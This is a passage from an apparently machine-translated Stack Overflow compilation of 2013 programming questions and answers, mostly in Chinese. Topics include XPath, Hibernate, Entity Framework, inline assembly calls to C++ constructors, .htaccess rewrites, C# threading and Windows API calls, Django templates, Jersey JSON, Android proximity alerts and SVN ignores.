        <transition event-source="that" event="new()" target="SUed" />
        ...
    </state>
</root> 
```

我只需要得到`<transition />`'s only with`@event-source='this'`和 distinct `@event`。

我对这一点的解决方案是选择所有`<transitions />`具有“this”属性的，然后对它们进行排序，`@event`然后尝试只选择其中不同的，比如[这里](https://stackoverflow.com/questions/2812122/distinct-in-xpath)

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
    <xsl:for-each select="//transition[@event-source='this']">
        <xsl:sort select="@event"/>
            <xsl:if https://stackoverflow.com/questions/2812122/distinct-in-xpath>
                <!--Here goes the transformation-->
            </xsl:if>
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet> 
```

但它不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:02:35.440

For selecting unique items, you can use the preceding axis to compare the current match to previous matches to make sure they aren't the same. An XPath query like the following should be all you need to select the unique items. I made the assumption that the uniqueness of the @event attribute was limited to other transition elements with the `@event-source='this'` and not global.

```
/root/state/transition[@event-source='this'][not(@event=preceding::transition[@event-source='this']/@event)] 
```

# java - 如何获取用 fetch = FetchType lazy 注释的属性名称？

> ID：14346568
> 
> 赞同：2
> 
> 时间：2013-01-15T20:44:32.717
> 
> 标签：java, spring, hibernate

我想获取具有惰性获取类型注释的属性列表。我可以通过反思来做到这一点并事先阅读。但是我想知道是否有任何其他方法可以事先从`ClassMetaData`or获取惰性属性列表`Persiter`？`getPropertyLaziness`没有返回正确的结果，getLazyProperties 也是如此？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T21:25:24.990

的`getPropertyLaziness`方法`ClassMetadata`应该返回正确的值。

你有没有尝试过这样的事情：

```
ClassMetadata meta = sessionFactory.getClassMetadata(entity.getClass());
String[] propertyNames = meta.getPropertyNames();
boolean[] propertyLaziness = meta.getPropertyLaziness();

for (int i = 0; i < propertyNames.length; i++) {
    String propertyName = propertyNames[i];

    // Check if the property fetch type is Lazy
    if (propertyLaziness[i]) {
        System.out.println("Property : " + propertyName + " fetch type is Lazy");
    }
} 
```

# linq - 将 Linq 表达式转换为使用 CompiledQuery

> ID：14346571
> 
> 赞同：1
> 
> 时间：2013-01-15T20:44:46.490
> 
> 标签：linq

我想弄清楚如何将 Linq 表达式转换为 CompiledQuery 这是我想要转换的现有方法

```
public IList<Item> GetAllItems()
{
    using (var pos = new ABCEntities())
    {
        var qryAllItems = from itm in pos.Items.Where(o=>o.Is_Inactive==false)
            select itm;

        return qryAllItems.ToList();
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T22:05:57.353

我假设这是实体框架，因为您的上下文类称为 ABC *Entities*。

创建一个私有静态字段来保存您编译的查询委托，然后使用该`CompiledQuery.Compile()`方法对其进行初始化（为了简洁起见，我选择在字段初始化程序中这样做......它可以在静态构造函数中完成，或者在第一次时懒惰地完成称为等）。然后在调用时调用委托`GetAllItems()`。

```
private static Func<ABCEntities, IQueryable<Item>> _activeItemsQuery = 
    CompiledQuery.Compile<ABCEntities, IQueryable<Item>>(
        (pos) => pos.Items.Where(o=>o.Is_Inactive==false));

public IList<Item> GetAllItems()
{
    using (var pos = new ABCEntities())
    {
        return _activeItemsQuery(pos).ToList();
    }
} 
```

更多关于 EF 编译查询的信息：http: [//msdn.microsoft.com/en-us/library/bb896297.aspx](http://msdn.microsoft.com/en-us/library/bb896297.aspx)。

我还删除了您的`from`and`select`因为当您使用该扩展方法语法时不需要它们。我本可以交替做：

```
private static Func<ABCEntities, IQueryable<Item>> _activeItemsQuery = 
    CompiledQuery.Compile<ABCEntities, IQueryable<Item>>(
        (pos) => from itm in pos.Items where itm.Is_Inactive == false select itm; 
```

但我个人大部分时间更喜欢使用扩展方法。

# javascript - CoffeeScript 和 OOP - 原型方法

> ID：14346574
> 
> 赞同：0
> 
> 时间：2013-01-15T20:45:06.213
> 
> 标签：javascript, oop, coffeescript

假设我执行以下代码：

```
class Test
  t: ->
    "hell"
  d: ->
    console.log t()
    "no" 
```

它将编译为：

```
(function() {
  this.Test = (function() {
    function Test() {}
    Test.prototype.t = function() {
      return "hell";
    };
    Test.prototype.d = function() {
      console.log(t());
      return "no";
    };
    return Test;
  })();
}).call(this); 
```

好的，我不能在方法`t()`内部调用`d()`方法。

为什么不？我该如何解决？

提前致谢。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-01-15T20:46:07.900

```
class Test
  t: ->
    "hell"
  d: ->
    console.log @t()
    #           ^ Added
    "no" 
```

在 CoffeeScript 中，就像在 Javascript 中一样，原型上的方法必须作为`this`. CoffeeScript 有`this`,`@`字符的简写。 `@t()`编译为`this.t()`. 并将在您调用它的实例的上下文中`this.t()`执行`Test.prototype.t()`。

# c++ - 使用 asm 中的引用参数调用 C++ 成员函数

> ID：14346576
> 
> 赞同：5
> 
> 时间：2013-01-15T20:45:13.407
> 
> 标签：c++, assembly, x86

我想通过 asm 块调用 C++ 成员函数。编译器是 MSVC++ (VS2008)，可移植性不是问题。我必须为嵌入式系统构建一个远程处理/RMI 类型的机制。客户端发送对象名称、方法名称、参数（序列化），我需要将方法调用到适当的对象。我可以从 PDB 文件中获得的类型信息。我需要编写一个通用的 Invoke 函数。我被困在如何调用将对象作为参数的成员函数。特别是。我无法获得指向复制 ctor 的指针。任何想法。

PS：下面的代码为 C::funcRef 编译并正确运行

```
#include <stdio.h>
struct Point
{
   int x;
   int y;
   Point() 
   { 
       x = 10; 
       y =10;
   }
   Point(const Point& p)
   {
       x = p.x;
       y = p.y;
   }
   virtual ~Point() 
   {
   }
};

class C
{
 public:
     void funcRef(Point& p) 
     { 
         printf("C::funcRef\n x= %d, y =%d\n", p.x, p.y);
     }
     void funcObj(Point p) 
     { 
         printf("C::funcObj\nx = %d y = %d\n", p.x, p.y); 

      }

};

void main()
{
   C* c = new C;
   Point p;

   //c->funcRef(p);
   // this works
   __asm
   {

      lea eax, p;
      push eax; 
      mov ecx, c;
      call [C::funcRef];

   }

  // c->funcObj(p); 
   __asm 
   {
       sub esp, 12; // make room for sizeof(Point)
       mov ecx, esp; 
       lea eax, p;
       push eax;
       // how to call copy ctor here
       mov ecx, c;
       call [C::funcObj];

   }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:46:05.857

由于复制构造函数是非虚拟的，您只需按名称查找并调用它。了解您的编译器如何破坏复制构造函数，以及如何按名称解析符号（您可能对[GetProcAddress](http://msdn.microsoft.com/en-us/library/ms683212%28v=vs.85%29.aspx)感兴趣）。

这是一个 linux 示例，但请注意它使用与 Visual Studio 不同的调用约定：

```
#include <stdio.h>
#include <dlfcn.h>

struct Point
{
   int x;
   int y;
   Point()
   {
       printf("Default constructing point @%p\n", this);
       x = 10;
       y = 10;
   }
   Point(const Point& p) __attribute__((used, visibility("default")))
   {
       printf("Copy constructing point @%p from point @%p\n", this, &p);
       x = p.x;
       y = p.y;
   }
   virtual ~Point()
   {
       printf("Point @%p destroyed\n", this);
   }
};

class C
{
 public:
     void funcRef(Point& p)
     {
         printf("C::funcRef\n x= %d, y =%d\n", p.x, p.y);
     }
     void funcObj(Point p)
     {
         printf("C::funcObj p = %p, x = %d, y = %d\n", &p, p.x, p.y);

      }

};

typedef void (C::*FRef)(Point&);
typedef void (C::*FObj)(Point);

int main()
{
   C* c = new C;
   Point p;

   FRef _fref =  &C::funcRef;
   FObj _fobj =  &C::funcObj;

//   c->funcObj(p);
   void* self = dlopen(NULL, RTLD_NOW | RTLD_GLOBAL);
   printf("Module handle for self is %p\n", self);
   // mangled name of Point::Point(const Point&)
   void* constructor = dlsym(self, "_ZN5PointC1ERKS_");
   printf("Constructor address is %p\n", constructor);
   void* dummy;
   __asm__ __volatile__ (
      "sub esp, 32\n\t"
      "mov [esp+4], %[p] # argument to copy constructor\n\t"
      "lea eax, [esp+20]\n\t"
      "mov [esp], eax # this pointer\n\t"
      "call %[constructor] # construct instance at [esp+20]\n\t"
      "lea eax, [esp+20]\n\t"
      "mov [esp+4], eax # argument to function\n\t"
      "mov [esp], %[c] # this pointer\n\t"
      "call %[fobj]\n\t"
      "lea eax, [esp+20]\n\t"
      "mov [esp], eax # this pointer\n\t"
      "mov eax, [eax] # vtable\n\t"
      "call [eax] # destructor\n\t"
      "add esp, 32 # free rest of stack\n\t"
      : "=a" (dummy), "=c" (dummy)
      : [p] "a" (&p), [c] "S" (&c), [fobj] "D" ((void*)_fobj), [constructor] "c" (constructor)
      : "edx");
   return 0;
} 
```

测试运行：

```
Default constructing point @0xffc145e4
Module handle for self is 0xf77fb900
Constructor address is 0x8048c02
Copy constructing point @0xffc145b4 from point @0xffc145e4
C::funcObj p = 0xffc145b4, x = 10, y = 10
Point @0xffc145b4 destroyed
Point @0xffc145e4 destroyed 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T15:13:25.193

Jester 提供了一种方法来解决这个问题。我发现了另一种特定于 MSVC 的方法。我们可以使用**FUCDNAME**来获取复制 ctor 的修饰名称，然后获取 procadderss。这是我修改后的代码

```
#include <stdio.h>
struct Point
{
   static char* pointCopyCtorName;
   int x;
   int y;
   Point() 
   { 
       if ( !pointCopyCtorName )
       {
           // force copy ctor
           Point(*this);
       }
       x = 10; 
       y =10;
   }
   __declspec(dllexport) Point(const Point& p)
   {
       if ( !pointCopyCtorName )
         pointCopyCtorName = __FUNCDNAME__;
       if ( this != &p )
       {
            x = p.x;
            y = p.y;
       }
   }

   virtual ~Point() 
   {
   }
};
char* Point::pointCopyCtorName = NULL;

class C
{
 public:
     void funcRef(Point& p) 
     { 
         printf("C::funcRef\n x= %d, y =%d\n", p.x, p.y);
     }
     void funcObj(Point p) 
     { 
         printf("C::funcObj\nx = %d y = %d\n", p.x, p.y); 

      }

};

HMODULE GetCurrentModule()
{
    HMODULE hMod = NULL;
    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, 
        (LPCTSTR) "GetCurrrentModule", &hMod);
    return hMod;
}

void main()
{
   C* c = new C;
   Point p;
   HMODULE hMod = GetCurrentModule();
   if ( !hMod )
       return;

   FARPROC pPointCopyCtor = GetProcAddress(hMod, p.pointCopyCtorName);
   if ( !pPointCopyCtor )
       return;

   //c->funcRef(p);
   // this works
   __asm
   {

      lea eax, p;
      push eax; 
      mov ecx, c;
      call [C::funcRef]; 
   }

  // c->funcObj(p); 
   __asm 
   {
       sub esp, 12;
       mov ecx, esp;
       lea eax, p;
       push eax;
       call pPointCopyCtor;
       mov ecx, c;
       call [C::funcObj];
   }

} 
```

# .htaccess - 如何使用 .htaccess 从文件名中删除查询字符串？

> ID：14346579
> 
> 赞同：0
> 
> 时间：2013-01-15T20:45:27.897
> 
> 标签：.htaccess, mod-rewrite, url-rewriting

所以目前我有一个像这样的网址：

[http://test.com/images/1/Villa-1_watermark.jpg&width=132&height=123](http://test.com/images/1/Villa-1_watermark.jpg&width=132&height=123)

理想情况下，我希望在图像目录中有一个 .htaccess 文件，该文件从位于子目录中的所有图像中删除查询字符串（“&width=132&height=123”）。

我目前有：

```
Options +FollowSymlinks -MultiViews
RewriteEngine on

RewriteCond %{QUERY_STRING} ^width=([^&]+)&height=([^&]+)$ [NC]
RewriteRule . %{REQUEST_URI}? [L,R] 
```

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:21:35.037

Apache 无法识别`&width=132&height=123`为查询字符串，因为它没有前导`?`. 试试这个：

```
RewriteEngine on

RewriteRule (.*)&.* $1 [L] 
```

# c# - 定义一个泛型类并实现泛型接口

> ID：14346584
> 
> 赞同：0
> 
> 时间：2013-01-15T20:45:46.727
> 
> 标签：c#, generics

我有以下代码

```
public interface IDummy<TType> where TType : new()
{
}

public class Dummy<TType> : IDummy<TType>
{
} 
```

并且编译失败，因为`Error 1 'TType' must be a non-abstract type with a public parameterless constructor in order to use it as parameter 'TType' in the generic type or method 'ConsoleApplication1.IDummy<TType>' D:\Temp\ConsoleApplication1\Dummy.cs 5 18 ConsoleApplication1`

但是如果我将代码更改为

```
public interface IDummy<TType>
{
}

public class Dummy<TType> : IDummy<TType> where TType : new()
{
} 
```

然后编译成功。我无法在接口级别定义泛型类型要求？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:47:52.437

您需要*对这两个*地方进行限制：

```
public interface IDummy<TType> where TType : new()
{
}

public class Dummy<TType> : IDummy<TType> where TType : new()
{
} 
```

# c# - 在asp.net中调用函数时如何显示输入值的描述？

> ID：14346585
> 
> 赞同：1
> 
> 时间：2013-01-15T20:45:48.073
> 
> 标签：c#, asp.net

我想在 asp.net 中添加我们在函数中输入的参数/值的描述。

这样当我们调用该函数时，它将显示要输入的值的描述。

代码：

```
public static void DoingSplit(string name, int id)
{
  // some code
}

protected void Page_Load(object sender, EventArgs e)
{
  // some code
  DoingSplit(name,id);
} 
```

当有人调用该函数时我想做

```
DoingSplit( 
```

当他按下**(**键智能感知显示描述你必须传递的值类型。

在我的情况下，通常它只会显示**string 。**

我想在此添加更多描述。like :**输入不带空格的字符串。**

任何人都可以帮助我解决这个问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T20:58:28.057

您可以通过在方法上方的行中键入 /// 来执行此操作。这将自动生成 XML 文档供您填写：方法描述、您使用的每个变量的描述以及（如果返回任何内容）方法返回的内容。

例子：

```
/// <summary>
/// checks if the given number is prime
/// </summary>
/// <param name="number">the number to be checked</param>
/// <returns>boolean that is true if the number given is prime</returns>
private bool CheckIsPrime(int number)
{
    //code
} 
```

# html - 如何在下一页设置选择值

> ID：14346586
> 
> 赞同：0
> 
> 时间：2013-01-15T20:45:48.647
> 
> 标签：html, django, select

我在这里很困惑。我正在尝试将所选选项的值设置为我从以前的表单提交中获得的值。

我的表格：

```
...
<select name="city"><option>city</option>... 
```

然后提交后，我登陆这个页面：

```
your selected criteria: 
<select name="city" value="{{city}}"><option>city</option>... 
```

但我不能这样做，因为`select`没有`value`选择。我怎样才能捕捉到值并设置为选择选项？

通过 js，这是一个不好的选择，我只想要一个真正的 django 解决方案。

感谢帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:57:30.110

试试这个..

```
<select>
{% for x in cities %}
  {% if x == city %}
        <option selected=selected>{{x}}</option>

   {% else %}
        <option>{{x}}</option>

  {% endif %}

{% endfor %}
</select> 
```

# c# - 获取当前打开的窗口的名称

> ID：14346587
> 
> 赞同：1
> 
> 时间：2013-01-15T20:45:49.553
> 
> 标签：c#

我想知道如何获取在 C# 中打开的当前窗口的名称。我看了又看，到目前为止还没有找到我的问题的解决方案，我希望stackoverflow可以提供帮助。

一个我会想的例子

```
String currentWindow = Window.Current.toString(); 
```

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:51:45.223

这是一个实现预期效果的片段，我很可能在不久前从 SO 的作者那里获得，所以这很可能是重复的。但是，这里的片段并非如此：

```
private static string GetActiveWindowTitle()
{
    const int nChars = 256;
    StringBuilder buff = new StringBuilder(nChars);
    IntPtr handle = GetForegroundWindow();
    return GetWindowText(handle, buff, nChars) > 0 ? buff.ToString() : null;
}

[DllImport("user32.dll")]
private static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")]
private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count); 
```

示例用法：

```
string activeWindowTitle = GetActiveWindowTitle() ?? "Unknown Window"; 
```

用于`platform invoke`调用[`GetForegroundWindow`](http://msdn.microsoft.com/en-gb/library/windows/desktop/ms633505%28v=vs.85%29.aspx)将句柄返回到当前前台窗口的调用。然后，您可以将句柄传递给[`GetWindowText`](http://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CDQQFjAA&url=http://msdn.microsoft.com/en-gb/library/windows/desktop/ms633520%28v=vs.85%29.aspx&ei=8sD1ULKBF8-7hAer_YBQ&usg=AFQjCNFvt33DuDjWTgzHGrAtMPDPqauU9A&sig2=XOS3MBSWJtv3F2-W2XnU2w&bvm=bv.41018144,d.ZG4)函数，该函数将返回窗口标题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T21:09:01.723

```
[ DllImport("user32.dll") ]
static extern int GetWindowText(int hWnd, StringBuilder text, int count); 
```

导入它，然后像这样使用；

```
int CharacterMap = 256;
StringBuilder StringInput = new StringBuilder(CharacterMap);
IntPtr Window = GetForegroundWindow();
String WindowTitle = GetWindowText(CharactrMap,StringInput,Window) > 0 ? StringInput.ToString() null; 
```

没有注意到上面的帖子。哎呀！丁：

# javascript - 通过迭代准备 JSON

> ID：14346589
> 
> 赞同：0
> 
> 时间：2013-01-15T20:45:56.493
> 
> 标签：javascript, jquery, json

我是 jquery 和 JSON 的新手，这就是我想要做的。我有一个 firstName 字段、lastName 字段和类“actionDueDate_input”的日期字段列表。我想生成一个 JSON，它具有 firstName、lastName 并遍历所有日期字段并将它们插入 JSON。

我正在尝试执行以下操作，它给了我“未定义”。这里有一些基本的问题，我无法弄清楚。

```
var dateval="";
$('div.action input.actionDueDate_input').each(function(index)
{
    if(index>0)
    {
        dateval+=",";
    }
    dateval+="{";
    dateval+='"';
    dateval+="actionDueDate";
    dateval+='"'+":";
    dateval+='"'+$(this).val()+'"'+"}";
});

alert(dateval);

var values={"contact":
[
    {
        "givenName":givenName,
        "familyName":familyName,
        "actionSet":
        [
            dateval
        ],
    }
]};

alert('Action Dates for client one:  '+values.contact[0].actionSet[0].actionDueDate); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:48:59.700

JSON 采用特殊格式的字符串形式，而不是数组。解析 JSON 时会得到一个数组。

要 JSON 化一个数组，请使用`JSON.stringify(arr)`.

这是一个示例，它采用原始形式的所有值并将它们捆绑到 JSON 字符串中：

```
var formInputs = {},
    jsonString;

$('form').find('input', 'select').each(function(){
    formInputs[this.name] = this.value;
});

jsonString = JSON.stringify(formInputs); 
```

# json - 没有关键属性名称的 Jersey JSON 输出

> ID：14346594
> 
> 赞同：2
> 
> 时间：2013-01-15T20:46:08.240
> 
> 标签：json, jaxb, jersey

已编辑：我正在尝试编组使用 Jersey 提供的自定义对象（我的持久层由 EclipseLink 提供）。我所有的代码都运行良好，但是当我调用服务时我遇到了一个问题，因为它返回一个没有键的 JSON 对象，只有值。

要返回 JSON，我只需使用 Jersey 提供的标准类，并在模型中包含 XML 注释（用于 JAXB）。

有谁知道我怎样才能打印出对象属性名称（键）？

提前致谢！

## **泽西岛资源**

```
(...)
@Path("/User")
public class User {
    @GET 
    @Path("/search")
    @Produces(MediaType.APPLICATION_JSON)
     public List<model.User> getUserByNick(@QueryParam("nick") String nick) {
         UserDao u = new UserDao();
         List<model.User> users = u.getUserByNick2(nick);

         return users;
     }
} 
```

## **Json 结果：**

```
[["test1","active"]] 
```

## 我的模型对象是：

```
package model;

import java.io.Serializable;
import javax.persistence.*;

import java.util.Date;
import java.util.List;

import javax.xml.bind.annotation.XmlElement;
import javax.xml.bind.annotation.XmlRootElement;

@Entity
@XmlRootElement(name = "user")
public class User implements Serializable {
    private static final long serialVersionUID = 1L;

    @Id
    @GeneratedValue(strategy=GenerationType.IDENTITY)
    private String id;

    @XmlElement
    private byte acceptedconditions;

    @XmlElement
    private String conditionshash;

    @XmlElement
    @Temporal(TemporalType.TIMESTAMP)
    private Date creationdate;

    @XmlElement
    private String email;

    @XmlElement
    private String nick;

    @XmlElement
    private String password;

    //bi-directional many-to-one association to Request
    @XmlElement
    @OneToMany(mappedBy="user")
    private List<Request> requests;

    //bi-directional many-to-one association to Language
    @XmlElement
    @ManyToOne
    @JoinColumn(name="languageid")
    private Language language;

    //bi-directional many-to-one association to Status
    @XmlElement
    @ManyToOne
    @JoinColumn(name="statusid")
    private Status status;

    //bi-directional many-to-one association to Usercompanydata
    @XmlElement
    @OneToMany(mappedBy="user")
    private List<Usercompanydata> usercompanydata;

    public User() {
    }

    public String getId() {
        return this.id;
    }

    public void setId(String id) {
        this.id = id;
    }

    public byte getAcceptedconditions() {
        return this.acceptedconditions;
    }

    public void setAcceptedconditions(byte acceptedconditions) {
        this.acceptedconditions = acceptedconditions;
    }

    public String getConditionshash() {
        return this.conditionshash;
    }

    public void setConditionshash(String conditionshash) {
        this.conditionshash = conditionshash;
    }

    public Date getCreationdate() {
        return this.creationdate;
    }

    public void setCreationdate(Date creationdate) {
        this.creationdate = creationdate;
    }

    public String getEmail() {
        return this.email;
    }

    public void setEmail(String email) {
        this.email = email;
    }

    public String getNick() {
        return this.nick;
    }

    public void setNick(String nick) {
        this.nick = nick;
    }

    public String getPassword() {
        return this.password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public List<Request> getRequests() {
        return this.requests;
    }

    public void setRequests(List<Request> requests) {
        this.requests = requests;
    }

    public Language getLanguage() {
        return this.language;
    }

    public void setLanguage(Language language) {
        this.language = language;
    }

    public Status getStatus() {
        return this.status;
    }

    public void setStatus(Status status) {
        this.status = status;
    }

    public List<Usercompanydata> getUsercompanydata() {
        return this.usercompanydata;
    }

    public void setUsercompanydata(List<Usercompanydata> usercompanydata) {
        this.usercompanydata = usercompanydata;
    }

} 
```

# c# - vsHost.exe，毁了我的速度，退出Visual Studio后继续运行

> ID：14346598
> 
> 赞同：1
> 
> 时间：2013-01-15T20:46:19.587
> 
> 标签：c#, multithreading, sleep

需要：任何减轻 CPU 使用率的提示或技巧，这会导致我的应用程序（以及因此，我的整个系统）缓慢爬行。

我有一个应用程序。它调用几个线程。大概5个左右（目前猜测）。串行端口线程是绝对必要的。我有理由相信该线程正在负责任地行事（例如，所有字节都到达那里，就像他们应该的那样）。

我有几个其他线程来观察后台串行端口处理程序的结果，并响应`button1_click`例程等中发生的信号量，以便每个人都相处融洽，整个事情运行顺利。基本上，它们只是检查信号量和分支的大while循环，如果值这样的话。

我最近添加了 20 个额外的单独线程；与其他人分开。这些线程将点和线放在 20 个矩形上（有问题的设备有 20 个通道）。我的应用程序的存在是为了记录和绘制它们。

由于添加了这些线程，应用程序立即变得非常慢。事实上，整个机器变得非常缓慢。

所以我停止了应用程序；机器仍然很慢。所以我退出了 Visual Studio；还是很慢。

次要症状：电脑本身的风扇转速加快；然后又加快了速度；也许第三次。我认为是电源风扇；但无论如何，它是一个风扇，它继续增加它的速度。任务管理器给我看了这个...

![任务管理器性能](../Images/585853936c982347fd963c8851cb4603.png) 进程选项卡显示大猪是...

> myApp.vshost.exe

他对那个过程的“描述”是……

> vshost32.exe

我使用任务管理器结束该过程。

顺便说一句，这不是一个应用程序，`Applications`标签上没有列出这样的命名应用程序。我只在`Processes`标签中看到它。

进程结束后`myApp.vshost32.exe`，CPU使用率又回落了，就像和谐一样，像这样……

![结束 vshost32.exe 后的任务管理器](../Images/3d1cd8f67364a7be02d039ab40cd54d9.png) CPU 使用率几乎垂直的增长都与启动 20 个新线程的行为高度相关。（单击按钮启动线程；单击，zap，CPU 100。）回落到接近零的状态与结束的行为完全相关，`vshost32.exe`所以我非常有信心（至少在这一刻）这`vshost32.exe`是负责任的。

当我添加此部分时，问题就开始了......

```
 //
       //
       //  Do a bunch of stuff to set up the 20 graphs; had no problem
       // 
       // 

        for (int i = 0; i < 20; i++)
        {                                   // Start each thread
             our20Graphs[i].Begin();        // Start my problems
        }                                   // Entire machine now goes 2 MPH 
```

真正的罪魁祸首，在它自己的类中，在它自己的文件中，在这里......

```
 this.th = new Thread(new ThreadStart(RunTarget));

    //
    //
    // lots of other stuff
    //
    //
    //

    public void Begin()                             ///// A method in the Runtarget 
    {
        this.th.Start();
        this.th.IsBackground = true;
    } 
```

我见过与我的任务类似的其他应用程序，它们会主动、实时地创建一组高度相似的图表，而不会接近这些 CPU 使用率的极限，而且速度更快。

目前，我的绘图程序花费了太多时间，以至于数据根本不会出现在屏幕上。不知道这一切是怎么回事。

如果这还不够糟糕（而且还不够糟糕，那就是表演停止者），这会使整个机器减慢到我的应用程序比 prima donna 应用程序更糟糕的地步，它完全没有资格使用任何用途（机器基本上停止冷却）。

那么，为什么 20 个线程会对系统造成如此可怕的负担呢？

我是否应该故意让每个线程休眠一段时间，以便其他线程有机会做他们的事情？

最大的困惑：为什么`myApp.vshost.exe`即使在我结束应用程序并退出 Visual Studio 之后仍继续运行（作为 99% 的 CPU 猪）？

欢迎就我可能采取的措施来消除占用如此多 CPU 时间的东西提出建议。

（添加编辑，根据社区建议，这是 RunTarget）

```
 private void RunTarget()
    {
        while (proceed)
        {
            if (!finished)
            {
                if (!pause)
                {
                    this.screenReady = false;
                    g.Clear(Color.Black);

                    //   bg.DrawRectangle(new Pen(Brushes.Aqua, 3), new Rectangle(0, 0, 1024, 40));
                    //  oldG.DrawRectangle(new Pen(Brushes.Red, 3), new Rectangle(0, 0, 1024, 40));

                    if (v_surface)
                    {
                        g.DrawImage(beginSurface, new Point(ImagePlace - area.Width, 0));

                        g.DrawImage(OldSurface, new Point(ImagePlace + 1, 0));

                        // g.DrawString(ArrayPlacement.ToString(),new Font("Arial",18),Brushes.Blue,new PointF(20,20));
                    }
                    else
                    {

                        g.DrawImage(OldSurface, new Point(ImagePlace - area.Width, 0));

                        g.DrawImage(beginSurface, new Point(ImagePlace + 1, 0));

                    }

                    this.screenReady = true;

                    if (ImagePlace % 64 == 0)               //// 64 is the size of the array of ints
                    {
                        finished = true;
                    }

                    if (ImagePlace == area.Width)
                    {
                        ImagePlace = 0;

                        if (v_surface)
                        {
                            v_surface = false;
                        }
                        else
                        {
                            v_surface = true;
                        }
                    }
                    else
                    {
                        ImagePlace += 32;               //// This is the scrolling increment
                    }

                    Draw();                             //// This physically puts it on the screen
                }
            }
        }
    }                                                   //// End of private void RunTarget() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:00:01.697

![在此处输入图像描述](../Images/017540556677f188e91f1f5933cfcb0c.png)

尝试从项目属性中禁用 Visual Studio 托管进程。它在项目属性--> 调试--> 启用调试器中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-16T18:16:18.353

我认为这里有几个问题。首先，正如其他人所提到的，您的绘图线程本质上是无限循环，并且您似乎正在通过“忙等待”暂停数据，这将使用每个线程单个核心的 100% CPU 时间。将其乘以您正在使用的 20 个线程，您为系统提供了足够的工作来完全占用 20 个 CPU 内核，远远超过您的系统，因此它使系统上的其他线程处于饥饿状态，从而使机器慢得爬行。

我命令它响应，您需要使用某种等待机制重新实现数据点的暂停。Thread.Sleep 就是这样一种方法，但它可能会导致您的绘图出现抖动。取而代之的是某种阻塞队列，例如 BlockingCollection，它允许您的消费者线程在没有可用数据时等待（不使用 CPU 时间），而不是像您当前的实现那样忙于等待。

另一个问题是绘图应该始终发生在主线程中，而让后台线程进行绘图活动可能会导致其他问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-01T23:02:49.977

就像 Dhawalk 先生一步一步说的：

1.  在“解决方案资源管理器”中，右键单击“您的项目名称”

2.  选择“项目属性”。

3.  从“项目属性”窗口中选择“调试”选项。

4.  如果选中“启用视觉工作室托管过程”：取消选中它。

请参见下图：

![在此处输入图像描述](../Images/017540556677f188e91f1f5933cfcb0c.png)

# android - 在谷歌地图中获取半径

> ID：14346601
> 
> 赞同：0
> 
> 时间：2013-01-15T20:46:31.100
> 
> 标签：android, google-maps, google-maps-api-2

我正在制作一个使用 GoogleMap v2 的应用程序。并且用户应该能够选择一个点，然后选择半径。因此，半径将围绕所选点移动 10 米，并以某种方式保存它，当用户移动时，设备应该检查如下；“嗯......他是否在选定的区域？”，我知道不好的解释，但你明白了。所以我想了很多我应该如何做到这一点，但还没有真正找到任何好的解决方案。考虑过在一个数组中保存例如 100 个坐标，然后设备应该检查您当前的位置是否与数组中的任何坐标匹配。但我真的不知道这对设备来说是否太重了，你知道它会使设备变得过于滞后或类似的东西......还是我完全错了？或者是否已经在 Maps API 中内置了这样的方法？

我希望至少有人明白我的意思并想帮助我！提前致谢。

附言。对不起英语不好！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:50:37.893

您可能正在寻找的是接近警报。查看[本教程](http://www.javacodegeeks.com/2011/01/android-proximity-alerts-tutorial.html)，当然还有[文档](http://developer.android.com/reference/android/location/LocationManager.html#addProximityAlert%28double,%20double,%20float,%20long,%20android.app.PendingIntent%29)。

根据我的经验，标准实现远非完美（有一个臭名昭著的错误`KEY_PROXIMITY_ENTERING`，并且在设置接近警报时会过度消耗电池电量），因此如果您想使用它，您可能需要三思而后行。如果您认为它不值得，并且如果您想自己实现类似的东西，那么可以从[这个库](http://code.google.com/p/little-fluffy-location-library/)开始。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T20:50:06.507

查看 LocationManager.addProximityAlert。它完全符合您的要求。

# java - 从工作站中删除 Eclipse。我如何告诉 SVN 忽略文件并填写版本标签

> ID：14346602
> 
> 赞同：0
> 
> 时间：2013-01-15T20:46:39.677
> 
> 标签：java, linux, spring, svn, maven

我正在从我的工作站中删除 Eclipse。我如何告诉 SVN 忽略文件并填写版本标签。

我一直在使用以下链接来告诉 eclipse 文件从 subversion 中忽略，但现在我停止使用 eclipse 如何告诉我的 subversion 客户端忽略我不想检查的文件。

Subversion 应该忽略 Maven 生成的 Eclipse 文件 - Maven - Java 教程 [http://www.java-tutorial.ch/maven/subversion-should-ignore-eclipse-files-generated-by-maven](http://www.java-tutorial.ch/maven/subversion-should-ignore-eclipse-files-generated-by-maven)

另外我如何告诉我的颠覆客户端填写我的版本标签？

svn - 在 Eclipse 中用 subversion 填充@version 标记 - [代码日志](https://stackoverflow.com/questions/2295661/fill-version-tag-with-subversion-in-eclipse)

我正在使用linux和mac。有人可以帮我在不使用日食的情况下完成上述两个设置吗？

谢谢

* * *

